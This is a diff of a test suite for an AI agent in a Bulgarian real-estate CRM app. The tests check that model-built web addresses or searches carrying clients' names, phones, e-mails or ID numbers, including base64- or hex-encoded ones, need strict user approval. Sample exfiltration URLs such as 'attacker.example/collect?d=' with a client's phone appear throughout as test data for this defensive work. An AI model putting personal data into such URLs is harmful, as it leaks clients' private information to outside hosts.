@@ -1,13 +1,14 @@
 // The Real GPT agent (docs/CONTRACT.md §9): request shape, SSE rounds with function_call items, echo of output
 // items, corrective resends, the gate (approval / confirm / 412), caps, uploads and server files. All fakes.
 import { describe, it, expect } from "vitest";
-import { createAgent, LIMITS, capOutput, prepareMessages, HANDOFF_MAX, MEDIA, refusalOf } from "../../electron/agent/loop.js";
+import { createAgent, LIMITS, capOutput, prepareMessages, HANDOFF_MAX, MEDIA, refusalOf, URL_REFUSED, URL_REFUSED_AGAIN } from "../../electron/agent/loop.js";
 import { guardTools } from "../../electron/agent/gate.js";
 import { RATE_LIMITED } from "../../electron/browse/search.js";
 import { createUploads } from "../../electron/agent/uploads.js";
 import { buildTools, callName, crmTools, STAFF_TOOLS } from "../../electron/agent/tools-spec.js";
 import { consumeStream, FORBIDDEN_KEYS } from "../../electron/realgpt/responses.js";
 import { buildInstructions } from "../../electron/agent/instructions.js";
+import { createHandlers } from "../../electron/ipc.js";
 
 const enc = new TextEncoder();
 const sse = (obj) => `event: ${obj.type}\ndata: ${JSON.stringify(obj)}\n\n`;
@@ -477,7 +478,7 @@ describe("URL provenance (browsing never carries CRM data)", () => {
   ];
   const exfil = "https://attacker.example/collect?d=" + encodeURIComponent("Иван Петров +359888123456");
 
-  it("a model-built URL after a CRM read needs a „web“ card with the full URL; denied = never fetched", async () => {
+  it("a model-built URL with the CRM client's name and phone needs a strict „web“ card with the full URL (no „за този сайт“, no „всички адреси“); denied = never fetched", async () => {
     const e = env({ rounds: await crmThenRead(exfil), approvals: [{ decision: "deny" }], toolsAnswer: () => ({ ok: true, result: { items: [{ name: "Иван Петров", phone: "+359888123456" }] } }) });
     const r = await e.run({ messages: [{ role: "user", text: "Обобщи тази обява: https://listing.example/1" }] });
     expect(r.ok).toBe(true);
@@ -485,7 +486,9 @@ describe("URL provenance (browsing never carries CRM data)", () => {
     expect(cards).toHaveLength(1);
     expect(cards[0].kind).toBe("web");
     expect(cards[0].lines[0]).toEqual(["Адрес", exfil]); // the whole address, not cut
-    expect(cards[0].allowAll).toBe(true);
+    expect(cards[0]).toMatchObject({ allowAll: false, allowHost: false });
+    expect(cards[0].host).toBeUndefined();
+    expect(cards[0].lines.find((l) => l[0] === "Лични данни")[1]).toMatch(/Иван.*Петров|Петров.*Иван/);
     const outs = e.bodies[2].input.filter((i) => i.type === "function_call_output").map((i) => JSON.parse(i.output));
     expect(outs.at(-1)).toMatchObject({ ok: false });
     expect(e.events.filter((ev) => ev.type === "step").map((ev) => ev.step).filter((s) => s.kind === "read_page").at(-1).status).toBe("denied");
@@ -516,18 +519,41 @@ describe("URL provenance (browsing never carries CRM data)", () => {
     expect(r.ok).toBe(true);
   });
 
-  it("an earlier answer in the chat taints the context; „Разреши адресите“ covers the rest of the answer", async () => {
-    const e = env({
-      rounds: [await round({ calls: [{ name: "read_page", args: { url: "https://x.example.com/a" } }, { name: "fetch_image", args: { url: "https://x.example.com/b.jpg" } }] }), await round({ text: "ок" })],
-      approvals: [{ decision: "allow_all" }],
+  it("an earlier answer without the chat in MAIN's memory (as after a restart): its name in an address → a strict card; with a phone the chat counts as private – a model-built address asks per site, „Разреши всички адреси“ covers the rest of the answer but never a strict card", async () => {
+    const appr = (e) => e.events.filter((ev) => ev.type === "approval").map((ev) => ev.approval);
+    // Only „Име Фамилия“ in the earlier answer: not private – a plain address goes without a card, the surname does not.
+    let e = env({
+      rounds: [await round({ calls: [
+        { name: "read_page", args: { url: "https://x.example.com/a" } },
+        { name: "fetch_image", args: { url: "https://y.example.com/b.jpg?n=Petrov" } },
+      ] }), await round({ text: "ок" })],
+      approvals: [{ decision: "allow" }],
     });
-    await e.run({ messages: [{ role: "user", text: "Покажи клиентите" }, { role: "assistant", text: "Иван Петров, 0888 123 456" }, { role: "user", text: "А сега виж обявата" }] });
-    const cards = e.events.filter((ev) => ev.type === "approval");
-    expect(cards).toHaveLength(1);
-    expect(cards[0].approval.kind).toBe("web");
+    await e.run({ messages: [{ role: "user", text: "Покажи клиентите" }, { role: "assistant", text: "Иван Петров търси двустаен." }, { role: "user", text: "А сега виж обявата" }] });
+    expect(appr(e)).toHaveLength(1);
+    expect(appr(e)[0]).toMatchObject({ kind: "web", allowAll: false, allowHost: false });
+    expect(appr(e)[0].lines).toContainEqual(["Лични данни", "Петров"]);
+    // A phone in the earlier answer: private data in the chat.
+    e = env({
+      rounds: [await round({ calls: [
+        { name: "read_page", args: { url: "https://x.example.com/c?tel=0877000111" } },
+        { name: "read_page", args: { url: "https://x.example.com/a" } },
+        { name: "read_page", args: { url: "https://z.example.com/b" } },
+        { name: "fetch_image", args: { url: "https://z.example.com/b.jpg?tel=0877000111" } },
+      ] }), await round({ text: "ок" })],
+      approvals: [{ decision: "allow" }, { decision: "allow_all" }, { decision: "deny" }],
+    });
+    await e.run({ messages: [{ role: "user", text: "Покажи клиентите" }, { role: "assistant", text: "Иван Петров, 0877 000 111" }, { role: "user", text: "А сега виж обявата" }] });
+    const cards = appr(e);
+    expect(cards.map((c) => [c.lines[0][1], c.allowAll, c.allowHost, c.host])).toEqual([
+      ["https://x.example.com/c?tel=0877000111", false, false, undefined], // the phone: strict
+      ["https://x.example.com/a", true, true, "x.example.com"], // model-built in a private chat: per site → allow_all
+      ["https://z.example.com/b.jpg?tel=0877000111", false, false, undefined], // the phone again in a NEW address: strict again
+    ]);
+    expect(cards[0].lines).toContainEqual(["Лични данни", "0877 000 111"]);
   });
 
-  it("a search with a phone the employee did not type, after CRM data, needs a card; one the employee typed does not", async () => {
+  it("a search with a phone the employee did not type, after CRM data, needs a strict card; one the employee typed does not", async () => {
     const e = env({
       rounds: [
         await round({ calls: [{ name: "crm", args: { tool: "clients.search", input: { query: "Иван" } } }] }),
@@ -539,7 +565,318 @@ describe("URL provenance (browsing never carries CRM data)", () => {
     await e.run({ messages: [{ role: "user", text: "Намери в интернет 0888123456" }] });
     const cards = e.events.filter((ev) => ev.type === "approval").map((ev) => ev.approval);
     expect(cards).toHaveLength(1);
-    expect(cards[0].lines).toEqual([["Търсене", "0877 000 111"], ["Лични данни", "0877 000 111"]]);
+    expect(cards[0].lines.slice(0, 2)).toEqual([["Търсене", "0877 000 111"], ["Лични данни", "0877 000 111"]]);
+    expect(cards[0]).toMatchObject({ allowAll: false, allowHost: false });
+  });
+});
+
+// 0.1.5 owner: „Защо 15 пъти ми иска едно потвърждение или поне едно и също ми се вижда?“ – HYBRID rule: personal data
+// in a model-built address / query → always a strict card; otherwise a model-built address asks only in a chat with
+// real private data (CRM result, document read, Проект, Canvas, attached files), once per site; the same action is
+// asked once per answer.
+describe("hybrid provenance and ask-once (CONTRACT §9.3 rules 8–9)", () => {
+  const CLIENT = { ok: true, result: { clients: [{ id: "cl-1", name: "Тестов Клиентов", phone: "+359 877 555 444", email: "klient.test@example.test", egn: "8001010008", address: "ул. Тестова Липа 7", note: "Иска бърза продажба заради наследство" }] } };
+  const crmRead = () => round({ calls: [{ name: "crm", args: { tool: "clients.get", input: { id: "cl-1" } } }] });
+  const reads = (urls, name = "read_page") => round({ calls: urls.map((url) => ({ name, args: { url } })) });
+  const cardsOf = (e) => e.events.filter((ev) => ev.type === "approval").map((ev) => ev.approval);
+  const outsOf = (body) => body.input.filter((i) => i.type === "function_call_output").map((i) => JSON.parse(i.output));
+  const ask = [{ role: "user", text: "Провери клиента cl-1" }];
+  const SWEEP = [
+    "https://www.imot.bg/obiavi/prodazhbi/grad-shumen/tristaen",
+    "https://www.olx.bg/nedvizhimi-imoti/q-тристаен-шумен/",
+    "https://bazar.bg/obiavi/imoti?q=тристаен+шумен",
+    "https://www.alo.bg/obiavi/imoti-prodajbi/apartamenti-stai/?region_id=27&location_ids=4700",
+  ];
+
+  it("(a) a first question and a follow-up without CRM data or files: a listings sweep over the sites' search pages shows no card", async () => {
+    const answer1 = "Ето обявите: [Тристаен](https://www.imot.bg/obiava-1b172345678901234-prodava-tristaen), тел. 0888 777 666.";
+    const e = env({ rounds: [
+      await reads(SWEEP), await round({ text: answer1 }),
+      await reads(SWEEP.map((u) => u.replace(/tristaen|тристаен/g, "dvustaen"))),
+      await round({ calls: [{ name: "web_search", args: { query: "тристаен Шумен собственик" } }] }),
+      await round({ text: "Още обяви." }),
+    ] });
+    let r = await e.run({ chatId: "chat-sweep", messages: [{ role: "user", text: "Намери тристаен в Шумен по сайтовете" }] });
+    expect(r.ok).toBe(true);
+    expect(r.steps.filter((s) => s.kind === "read_page" && s.status === "ok")).toHaveLength(4);
+    // The follow-up: the earlier answer shows a listing id and a seller's phone (public results) – still no card.
+    r = await e.run({ chatId: "chat-sweep", messages: [{ role: "user", text: "Намери тристаен в Шумен по сайтовете" }, { role: "assistant", text: answer1 }, { role: "user", text: "А двустаен?" }] });
+    expect(r.steps.filter((s) => s.kind === "read_page" && s.status === "ok")).toHaveLength(4);
+    expect(r.steps.filter((s) => s.kind === "web_search").map((s) => s.status)).toEqual(["ok"]);
+    expect(cardsOf(e)).toEqual([]);
+  });
+
+  it("(b) a follow-up in a chat that used CRM data: one card per site – after „Разреши за този сайт“ no more cards for that site in this chat", async () => {
+    const e = env({ toolsAnswer: () => CLIENT, approvals: SWEEP.map(() => ({ decision: "allow_host" })), rounds: [
+      await crmRead(), await round({ text: "Тестов Клиентов търси тристаен." }),
+      await reads([...SWEEP, "https://www.imot.bg/obiavi/prodazhbi/grad-shumen/dvustaen"]),
+      await round({ calls: [{ name: "web_search", args: { query: "тристаен Шумен собственик" } }] }),
+      await round({ text: "Ето обявите." }),
+      await reads(SWEEP.map((u) => u + (u.includes("?") ? "&page=2" : "?page=2"))), await round({ text: "Още обяви." }),
+    ] });
+    await e.run({ chatId: "chat-crm", messages: ask });
+    expect(cardsOf(e)).toEqual([]);
+    const r = await e.run({ chatId: "chat-crm", messages: [...ask, { role: "assistant", text: "Тестов Клиентов търси тристаен." }, { role: "user", text: "Намери му тристаен в Шумен по сайтовете" }] });
+    const cards = cardsOf(e);
+    expect(cards.map((c) => c.host)).toEqual(["imot.bg", "olx.bg", "bazar.bg", "alo.bg"]); // the 2nd imot.bg page: no card
+    expect(cards.every((c) => c.kind === "web" && c.allowAll && c.allowHost && !c.lines.some((l) => l[0] === "Лични данни"))).toBe(true);
+    expect(cards[0].lines.slice(0, 2)).toEqual([["Адрес", SWEEP[0]], ["Сайт", "imot.bg"]]);
+    expect(r.steps.filter((s) => s.kind === "read_page" && s.status === "ok")).toHaveLength(5);
+    expect(r.steps.filter((s) => s.kind === "web_search").map((s) => s.status)).toEqual(["ok"]); // no personal data: no card
+    // The next answer of this chat: the same sites, other pages – no card.
+    await e.run({ chatId: "chat-crm", messages: [{ role: "user", text: "Още" }] });
+    expect(cardsOf(e)).toHaveLength(4);
+  });
+
+  it("after a restart (the chat is not in MAIN's memory) an earlier answer with a phone or an e-mail counts as private data: the sweep asks once per site", async () => {
+    const e = env({ approvals: SWEEP.map(() => ({ decision: "allow_host" })), rounds: [await reads([...SWEEP, "https://www.olx.bg/nedvizhimi-imoti/shumen/"]), await round({ text: "ок" })] });
+    await e.run({ chatId: "chat-restarted", messages: [{ role: "user", text: "Покажи клиента" }, { role: "assistant", text: "Тестов Клиентов, 0877 555 444, иска тристаен." }, { role: "user", text: "Намери тристаен в Шумен по сайтовете" }] });
+    expect(cardsOf(e).map((c) => [c.host, c.allowHost])).toEqual([["imot.bg", true], ["olx.bg", true], ["bazar.bg", true], ["alo.bg", true]]);
+  });
+
+  // Release gate C5: after a restart (or when the chat left MAIN's memory) the listing ids in the links of the earlier
+  // listings answer (imot.bg „1b172345678901234“, alo.bg „/10123456“, bazar.bg „/obiava/52345678/“) are no personal data.
+  const LISTINGS = [
+    "https://www.imot.bg/obiava-1b172345678901234-prodava-tristaen-apartament-grad-shumen-dobrudzhanski",
+    "https://www.alo.bg/10123456",
+    "https://bazar.bg/obiava/52345678/prodava-tristaen-shumen",
+  ];
+  const LISTINGS_ANSWER = [
+    "Намерих 3 обяви за тристаен в Шумен:", "",
+    "| № | Обява | Цена | Населено място | Разстояние | Телефон | Източник |",
+    "|---|---|---:|---|---|---|---|",
+    `| 1 | [Тристаен, Добруджански](${LISTINGS[0]}) | 95 000 € | Шумен | неуточнено | скрит | [imot.bg](${LISTINGS[0]}) |`,
+    `| 2 | [Тристаен, Център](${LISTINGS[1]}) | 110 000 € | Шумен | неуточнено | скрит | [alo.bg](${LISTINGS[1]}) |`,
+    `| 3 | [Тристаен, Тракия](${LISTINGS[2]}) | 88 000 € | Шумен | неуточнено | скрит | [bazar.bg](${LISTINGS[2]}) |`,
+  ].join("\n");
+  const listingsChat = [{ role: "user", text: "Намери тристаен в Шумен по сайтовете" }, { role: "assistant", text: LISTINGS_ANSWER }, { role: "user", text: "Отвори трите обяви и ми кажи повече" }];
+
+  it("release gate C5: after a restart the listings of the earlier listings answer open without a card – the ids in their links neither make the chat private nor raise a strict card (also for a photo with the id, and when the chat left the memory)", async () => {
+    let e = env({ approvals: [{ decision: "deny" }, { decision: "deny" }, { decision: "deny" }, { decision: "deny" }], rounds: [
+      await reads(LISTINGS), await reads(["https://www.imot.bg/photos/picturess/big/1b172345678901234_1.jpg"], "fetch_image"),
+      await reads(["https://www.imot.bg/obiavi/prodazhbi/grad-shumen/tristaen"]), await round({ text: "ок" }),
+    ] });
+    let r = await e.run({ chatId: "chat-listings-restarted", messages: listingsChat });
+    expect(cardsOf(e)).toEqual([]);
+    expect(r.steps.filter((s) => s.kind === "read_page").map((s) => s.status)).toEqual(["ok", "ok", "ok", "ok"]);
+    expect(r.steps.filter((s) => s.kind === "fetch_image").map((s) => s.status)).toEqual(["ok"]);
+    // the chat dropped out of the memory (31 newer chats) – the same
+    e = env({ rounds: [...await Promise.all(Array.from({ length: 31 }, () => round({ text: "x" }))), await reads(LISTINGS), await round({ text: "ок" })] });
+    for (let i = 0; i < 31; i++) await e.run({ chatId: `chat-other-${i}`, messages: [{ role: "user", text: "Здравей" }] });
+    r = await e.run({ chatId: "chat-listings-restarted", messages: listingsChat });
+    expect(cardsOf(e)).toEqual([]);
+    expect(r.steps.filter((s) => s.kind === "read_page" && s.status === "ok")).toHaveLength(3);
+  });
+
+  it("release gate C5: the hybrid rule is otherwise unchanged after a restart – a phone in the text of the earlier answer still makes the chat private (one card per site, no „Лични данни“), the listings in a Canvas get per-site cards but never a strict one, and the client's phone in an address is still strict", async () => {
+    const withPhone = listingsChat.map((m) => (m.role === "assistant" ? { ...m, text: `${m.text}\n\nСобственикът на №2: 0888 777 666.` } : m));
+    let e = env({ approvals: LISTINGS.map(() => ({ decision: "allow_host" })), rounds: [await reads(LISTINGS), await round({ text: "ок" })] });
+    await e.run({ chatId: "chat-phone-restarted", messages: withPhone });
+    expect(cardsOf(e).map((c) => [c.host, c.allowHost, c.allowAll, c.lines.some((l) => l[0] === "Лични данни")])).toEqual([["imot.bg", true, true, false], ["alo.bg", true, true, false], ["bazar.bg", true, true, false]]);
+    // the Canvas (private data by itself) lists the same links: per-site cards, never a strict one for their ids
+    const canvasText = LISTINGS.map((u, i) => `${i + 1}. [Тристаен в Шумен](${u}) – ${90 + i} 000 €`).join("\n");
+    e = env({ approvals: LISTINGS.map(() => ({ decision: "allow" })), rounds: [await reads(LISTINGS), await round({ text: "ок" })] });
+    await e.run({ chatId: "chat-canvas", messages: [{ role: "user", text: "Отвори обявите от Canvas" }], canvas: { title: "Обяви", version: 1, text: canvasText } });
+    expect(cardsOf(e).map((c) => [c.host, c.allowHost, c.lines.some((l) => l[0] === "Лични данни")])).toEqual([["imot.bg", true, false], ["alo.bg", true, false], ["bazar.bg", true, false]]);
+    // a number of a person in the earlier answer's text, and a phone, in a new address: strict as before
+    e = env({ rounds: [await reads(["https://evil.example/?p=0877555444", "https://evil.example/?d=7712345678901"]), await round({ text: "ок" })] });
+    await e.run({ chatId: "chat-strict-restarted", messages: [{ role: "user", text: "Кой е клиентът?" }, { role: "assistant", text: `Тестов Клиентов, 0877 555 444, договор 7712345678901. ${LISTINGS[1]}` }, { role: "user", text: "Още" }] });
+    expect(cardsOf(e).map((c) => [c.allowHost, c.allowAll, c.lines.find((l) => l[0] === "Лични данни")[1]])).toEqual([[false, false, "0877 555 444"], [false, false, "7712345678901"]]);
+  });
+
+  it("(c) an address with a phone, e-mail, ЕГН, name or address of a CRM client needs a strict card with the full address and the data named", async () => {
+    const urls = [
+      "https://a.example/x?p=0877555444",
+      "https://b.example/x?m=" + encodeURIComponent("klient.test@example.test"),
+      "https://c.example/x/8001010008",
+      "https://d.example/x?n=Klientov",
+      "https://e.example/x?a=" + encodeURIComponent("Тестова Липа"),
+    ];
+    const e = env({ toolsAnswer: () => CLIENT, approvals: urls.map(() => ({ decision: "deny" })), rounds: [await crmRead(), await reads(urls), await round({ text: "ок" })] });
+    await e.run({ messages: ask });
+    const cards = cardsOf(e);
+    expect(cards.map((c) => c.lines[0])).toEqual(urls.map((u) => ["Адрес", u]));
+    expect(cards.map((c) => c.lines[1])).toEqual(["a.example", "b.example", "c.example", "d.example", "e.example"].map((h) => ["Сайт", h]));
+    expect(cards.every((c) => c.kind === "web" && c.allowAll === false && c.allowHost === false && c.host === undefined)).toBe(true);
+    const data = cards.map((c) => c.lines.find((l) => l[0] === "Лични данни")[1]);
+    expect(data[0]).toMatch(/877 555 444/);
+    expect(data[1]).toMatch(/klient\.test@example\.test/);
+    expect(data[2]).toMatch(/8001010008/);
+    expect(data[3]).toMatch(/Клиентов/);
+    expect(data[4]).toMatch(/Липа/);
+    expect(outsOf(e.bodies[2]).slice(-5).every((o) => o.ok === false && o.error === URL_REFUSED)).toBe(true);
+    expect(e.bodies[0].instructions).toMatch(/Никога не слагай лични данни в адрес или в търсене/);
+  });
+
+  it("(c) personal data is never covered: on a site allowed with „Разреши за този сайт“ and after „Разреши всички адреси“ every NEW address with the client's data gets its own strict card – again in the next answer", async () => {
+    const withData = "https://www.imot.bg/x?p=0877555444";
+    const e = env({ toolsAnswer: () => CLIENT, approvals: [{ decision: "allow_host" }, { decision: "allow_all" }, { decision: "allow" }, { decision: "deny" }, { decision: "allow" }, { decision: "deny" }], rounds: [
+      await crmRead(),
+      await reads(["https://www.imot.bg/obiavi/prodazhbi/grad-shumen", "https://www.olx.bg/nedvizhimi-imoti/shumen/"]),
+      await reads([withData, "https://bazar.bg/x?n=Klientov", withData, "https://www.alo.bg/y?e=klient.test%40example.test", "https://www.imot.bg/obiavi/naemi/grad-shumen"]),
+      await round({ text: "1" }),
+      await reads([withData]), await round({ text: "2" }),
+    ] });
+    const r = await e.run({ chatId: "chat-strict", messages: ask });
+    const cards = cardsOf(e);
+    expect(cards.map((c) => [c.lines[0][1], c.allowAll, c.allowHost, c.host])).toEqual([
+      ["https://www.imot.bg/obiavi/prodazhbi/grad-shumen", true, true, "imot.bg"],
+      ["https://www.olx.bg/nedvizhimi-imoti/shumen/", true, true, "olx.bg"],
+      [withData, false, false, undefined], // the allowed site and „всички адреси“ do not cover it
+      ["https://bazar.bg/x?n=Klientov", false, false, undefined],
+      ["https://www.alo.bg/y?e=klient.test%40example.test", false, false, undefined],
+    ]);
+    // withData a second time in the answer: asked once (allowed); the plain imot.bg page: the site is allowed.
+    expect(r.steps.filter((s) => s.kind === "read_page").map((s) => s.status)).toEqual(["ok", "ok", "ok", "denied", "ok", "ok", "ok"]);
+    await e.run({ chatId: "chat-strict", messages: [{ role: "user", text: "Още веднъж" }] });
+    expect(cardsOf(e)).toHaveLength(6);
+    expect(cardsOf(e)[5]).toMatchObject({ allowAll: false, allowHost: false });
+    expect(cardsOf(e)[5].lines[0]).toEqual(["Адрес", withData]);
+  });
+
+  it("the same address twice in one answer → one card; once allowed it is allowed for the rest of the answer", async () => {
+    const u = "https://a.example/x?p=0877555444";
+    const e = env({ toolsAnswer: () => CLIENT, rounds: [
+      await crmRead(),
+      await round({ calls: [{ name: "read_page", args: { url: u } }, { name: "fetch_image", args: { url: `${u}#photo` } }] }),
+      await reads([u]), await round({ text: "ок" }),
+    ] });
+    const r = await e.run({ messages: ask });
+    expect(cardsOf(e)).toHaveLength(1);
+    expect(r.steps.filter((s) => s.kind === "read_page" && s.status === "ok")).toHaveLength(2);
+    expect(r.files).toHaveLength(1);
+  });
+
+  it("a refused address is not asked again: the model hears the refusal, no new step and no fetch", async () => {
+    const u = "https://a.example/x?p=0877555444";
+    const read = [];
+    const e = env({ toolsAnswer: () => CLIENT, approvals: [{ decision: "deny" }], rounds: [
+      await crmRead(), await reads([u]),
+      await round({ calls: [{ name: "read_page", args: { url: u } }, { name: "fetch_image", args: { url: u } }] }),
+      await round({ text: "ок" }),
+    ] });
+    const r = await e.run({ messages: ask });
+    expect(cardsOf(e)).toHaveLength(1);
+    expect(outsOf(e.bodies[3]).slice(-2)).toEqual([{ ok: false, repeated: true, error: URL_REFUSED_AGAIN }, { ok: false, repeated: true, error: URL_REFUSED_AGAIN }]);
+    expect(r.steps.filter((s) => s.kind === "read_page" || s.kind === "fetch_image").map((s) => s.status)).toEqual(["denied"]);
+    expect(read).toEqual([]);
+  });
+
+  it("„Разреши за този сайт“ = no more cards for that site until the end of the chat; other sites and other chats still ask", async () => {
+    const e = env({ toolsAnswer: () => CLIENT, approvals: [{ decision: "allow_host" }, { decision: "deny" }, { decision: "deny" }], rounds: [
+      await crmRead(), await reads(["https://www.site.example/a?q=tristaen"]), await reads(["https://site.example/b?q=dvustaen"]), await round({ text: "1" }),
+      // the next answer of the same chat: no CRM call – the chat remembers its private data and the allowed site
+      await reads(["https://www.site.example/c?page=2", "https://other.example/c?q=tristaen"]), await round({ text: "2" }),
+      // another chat with CRM data: the site is not allowed there
+      await crmRead(), await reads(["https://www.site.example/d"]), await round({ text: "3" }),
+    ] });
+    await e.run({ chatId: "chat-1", messages: ask });
+    expect(cardsOf(e)).toHaveLength(1);
+    expect(cardsOf(e)[0]).toMatchObject({ kind: "web", allowAll: true, allowHost: true, host: "site.example" });
+    await e.run({ chatId: "chat-1", messages: [{ role: "user", text: "Още веднъж" }] });
+    expect(cardsOf(e).map((c) => c.host)).toEqual(["site.example", "other.example"]);
+    await e.run({ chatId: "chat-2", messages: [{ role: "user", text: "Друг чат" }] });
+    expect(cardsOf(e).map((c) => c.host)).toEqual(["site.example", "other.example", "site.example"]);
+  });
+
+  it("a phone or a name hidden as base64 / hex in the query still needs a strict card", async () => {
+    const urls = [`https://a.example/t?d=${Buffer.from("0877555444").toString("base64")}`, `https://b.example/t?h=${Buffer.from("Клиентов").toString("hex")}`, `https://c.example/t?d=${Buffer.from("+359877555444").toString("base64url")}`];
+    const e = env({ toolsAnswer: () => CLIENT, approvals: urls.map(() => ({ decision: "deny" })), rounds: [await crmRead(), await reads(urls), await round({ text: "ок" })] });
+    await e.run({ messages: ask });
+    expect(cardsOf(e).map((c) => c.lines[0][1])).toEqual(urls);
+    expect(cardsOf(e).every((c) => !c.allowAll && !c.allowHost && c.lines.some((l) => l[0] === "Лични данни"))).toBe(true);
+  });
+
+  it("a search with a client's name from the CRM needs a strict card (no „този сайт“ for the search engine); a phone read on a public page does not", async () => {
+    const e = env({ toolsAnswer: () => CLIENT, approvals: [{ decision: "deny" }], rounds: [
+      await crmRead(),
+      await round({ calls: [{ name: "web_search", args: { query: "Тестов Клиентов Шумен" } }, { name: "read_page", args: { url: "https://imoti.example.com/1" } }] }),
+      await round({ calls: [{ name: "web_search", args: { query: "0888 123 456" } }, { name: "web_search", args: { query: "Тестов  Клиентов шумен" } }] }),
+      await round({ text: "ок" }),
+    ] });
+    // The page is the employee's own link (no card); its phone is public from then on.
+    const r = await e.run({ messages: [{ role: "user", text: "Намери тристаен в Шумен като https://imoti.example.com/1" }] });
+    const cards = cardsOf(e);
+    expect(cards).toHaveLength(1);
+    expect(cards[0]).toMatchObject({ kind: "web", allowAll: false, allowHost: false });
+    expect(cards[0].lines[0]).toEqual(["Търсене", "Тестов Клиентов Шумен"]);
+    expect(cards[0].lines[1][1]).toMatch(/Тестов, Клиентов/);
+    const last = outsOf(e.bodies[3]);
+    expect(last.at(-2)).toMatchObject({ ok: true, source: "web" });
+    expect(last.at(-1)).toMatchObject({ ok: false, repeated: true });
+    expect(r.steps.filter((s) => s.kind === "web_search").map((s) => s.status)).toEqual(["denied", "ok"]);
+  });
+
+  it("names of an attached document are sensitive: they need a strict card in an address; with a file attached the site search page asks once per site", async () => {
+    const store = fakeFiles();
+    const doc = store.add({ name: "договор.docx", mime: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", data: Buffer.alloc(900) }).file;
+    store.extract = async () => ({ ok: true, doc: { name: "договор.docx", kind: "docx", text: "Наемател: Тестимир Документов, гр. Шумен", truncated: false } });
+    const e = env({ fileStore: store, approvals: [{ decision: "allow_host" }, { decision: "deny" }], rounds: [await reads(["https://www.imot.bg/obiavi/naemi/grad-shumen", "https://a.example/?n=Dokumentov", "https://www.imot.bg/obiavi/naemi/grad-varna"]), await round({ text: "ок" })] });
+    await e.run({ messages: [{ role: "user", text: "Намери подобни наеми", files: [doc.id] }] });
+    expect(cardsOf(e).map((c) => [c.lines[0][1], c.allowHost])).toEqual([["https://www.imot.bg/obiavi/naemi/grad-shumen", true], ["https://a.example/?n=Dokumentov", false]]);
+    expect(cardsOf(e)[1].lines).toContainEqual(["Лични данни", "Документов"]);
+  });
+
+  it("the same CRM write twice in one answer: one card – done is not repeated, refused is not asked again", async () => {
+    const a = { tool: "calendar.create", input: { title: "Тестов оглед", start: "2026-11-18T10:00" } };
+    const b = { tool: "calendar.create", input: { start: "2026-11-19T10:00", title: "Тестов оглед" } };
+    const e = env({ approvals: [{ decision: "allow" }, { decision: "deny" }], rounds: [
+      await round({ calls: [{ name: "crm", args: a }] }), await round({ calls: [{ name: "crm", args: { ...a, input: { start: a.input.start, title: a.input.title } } }] }),
+      await round({ calls: [{ name: "crm", args: b }] }), await round({ calls: [{ name: "crm", args: b }] }),
+      await round({ text: "ок" }),
+    ] });
+    const r = await e.run();
+    expect(cardsOf(e).map((c) => c.kind)).toEqual(["crm_write", "crm_write"]);
+    expect(e.toolCalls.map(([t]) => t)).toEqual(["calendar.create"]);
+    expect(outsOf(e.bodies[2]).at(-1)).toMatchObject({ ok: true, repeated: true, result: { ok: 1 } });
+    expect(outsOf(e.bodies[4]).at(-1)).toMatchObject({ ok: false, repeated: true });
+    expect(r.steps.filter((s) => s.tool === "calendar.create").map((s) => s.status)).toEqual(["ok", "denied"]);
+  });
+
+  it("an allowed write that failed for certain runs again without a second card; maybe-executed is never repeated", async () => {
+    const a = { tool: "clients.update", input: { id: "cl-1", note: "x" } };
+    const b = { tool: "clients.update", input: { id: "cl-2", note: "y" } };
+    let n = 0;
+    const e = env({ toolsAnswer: (tool, input) => (input.id === "cl-1" ? (++n === 1 ? { ok: false, error: "Невалидни данни.", status: 400 } : { ok: true, result: { ok: 1 } }) : { ok: false, maybeExecuted: true, error: "HTTP 502" }), rounds: [
+      await round({ calls: [{ name: "crm", args: a }] }), await round({ calls: [{ name: "crm", args: a }] }),
+      await round({ calls: [{ name: "crm", args: b }] }), await round({ calls: [{ name: "crm", args: b }] }),
+      await round({ text: "ок" }),
+    ] });
+    await e.run();
+    expect(cardsOf(e)).toHaveLength(2);
+    expect(e.toolCalls.map(([, i]) => i.id)).toEqual(["cl-1", "cl-1", "cl-2"]);
+    expect(outsOf(e.bodies[4]).at(-1)).toMatchObject({ ok: false, maybeExecuted: true, repeated: true });
+  });
+
+  it("„Разреши за този сайт“ is accepted only on a web card that names one site; a strict card takes neither „за този сайт“ nor „всички адреси“", async () => {
+    const results = [];
+    const decideWith = (decisions) => (ev) => {
+      if (ev.type !== "approval") return;
+      setTimeout(() => { for (const decision of decisions) results.push([ev.approval.kind, decision, e.agent.approve({ requestId: "r1", approvalId: ev.approval.id, decision })]); }, 0);
+    };
+    let e = env({ rounds: [await round({ calls: [{ name: "crm", args: { tool: "calendar.create", input: { title: "Тестов" } } }] }), await round({ text: "ок" })] });
+    await e.run({ emit: decideWith(["allow_host", "deny"]) });
+    e = env({ toolsAnswer: () => CLIENT, rounds: [await crmRead(), await round({ calls: [{ name: "web_search", args: { query: "0877555444" } }] }), await round({ text: "ок" })] });
+    await e.run({ emit: decideWith(["allow_host", "allow_all", "deny"]), messages: ask });
+    e = env({ toolsAnswer: () => CLIENT, rounds: [await crmRead(), await reads(["https://www.imot.bg/x?p=0877555444"]), await round({ text: "ок" })] });
+    await e.run({ emit: decideWith(["allow_host", "allow_all", "deny"]), messages: ask });
+    e = env({ toolsAnswer: () => CLIENT, rounds: [await crmRead(), await reads(["https://www.imot.bg/obiavi/prodazhbi/grad-shumen"]), await round({ text: "ок" })] });
+    await e.run({ emit: decideWith(["allow_host", "deny"]), messages: ask });
+    expect(results.map(([k, d, r]) => [k, d, r.ok])).toEqual([
+      ["crm_write", "allow_host", false], ["crm_write", "deny", true],
+      ["web", "allow_host", false], ["web", "allow_all", false], ["web", "deny", true], // strict: the search
+      ["web", "allow_host", false], ["web", "allow_all", false], ["web", "deny", true], // strict: an address with the phone
+      ["web", "allow_host", true], ["web", "deny", false], // per-site card: allowed for the site (the card is gone)
+    ]);
+  });
+
+  it("IPC: ted:realgpt.approve passes „allow_host“ to MAIN's agent and still refuses unknown decisions", async () => {
+    const seen = [];
+    const h = createHandlers({ realgpt: { approve: (a) => { seen.push(a); return { ok: true }; } } });
+    expect(await h["ted:realgpt.approve"]({ requestId: "r1", approvalId: "ap_1", decision: "allow_host", host: "evil.example" })).toEqual({ ok: true });
+    expect(seen).toEqual([{ requestId: "r1", approvalId: "ap_1", decision: "allow_host" }]); // the host comes from MAIN's card, never from the window
+    expect((await h["ted:realgpt.approve"]({ requestId: "r1", approvalId: "ap_1", decision: "allow_site" })).ok).toBe(false);
